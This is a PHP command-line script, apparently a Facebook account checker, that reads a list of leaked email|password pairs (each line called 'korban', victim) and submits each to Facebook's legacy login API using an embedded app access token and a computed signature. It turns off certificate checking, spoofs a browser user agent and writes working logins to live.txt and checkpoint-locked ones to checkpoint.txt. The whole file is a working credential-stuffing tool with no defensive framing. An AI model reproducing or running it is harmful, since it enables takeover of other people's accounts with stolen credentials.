<?php
$biru = "\e[34m";
$kuning = "\e[33m";
$cyan = "\e[96m";
$magenta = "\e[35m";
$hijau = "\e[92m";
$merah = "\e[91m";

if(isset($argv[1])) {
    if(file_exists($argv[1])) {
        $knf = explode(PHP_EOL, file_get_contents($argv[1]));
        foreach($knf as $korban) {
            $potong = explode("|", $korban);
            Akun($potong[0], $potong[1]);
          
        }
    }else die("File doesn't exist!");
}else die("\n\033[90m Usage: php fbcheck.php target.txt \n\033[00m");
function Akun($email, $sandi) {
    $cr = array(
        "access_token" => "350685531728|62f8ce9f74b12f84c123cc23437a4a32",
        "email" => $email,
        "password" => $sandi,
        "locale" => "en_US",
        "format" => "JSON"
    );
    $sig = "";
    foreach($cr as $key => $value) { $sig .= $key."=".$value; }
    $sig = md5($sig);
    $cr['sig'] = $sig;
    $ch = curl_init("https://api.facebook.com/method/auth.login");
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $cr);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Kiwi Chrome/68.0.3438.0 Safari/537.36");
    $result = json_decode(curl_exec($ch));
    
     sleep(1);
echo "\e[90m> \e[1;97m";
    $empas =  $email."|".$sandi;
    if(isset($result->access_token)) { 
    	 echo $hijau;
        echo $empas."  \e[37m [\e[32mLIVE\e[37m]".PHP_EOL;
        file_put_contents("live.txt", $empas.PHP_EOL, FILE_APPEND);
    }elseif($result->error_code == 405 || preg_match("/User must verify their account/i", $result->error_msg)) {
        echo $merah;
echo  $empas."\e[97m [\e[93mCHECK\e[97m]".PHP_EOL;
        file_put_contents("checkpoint.txt", $empas.PHP_EOL, FILE_APPEND);
    }else echo  $empas."\e[97m  [\e[91mDEAD\e[97m]".PHP_EOL;
}
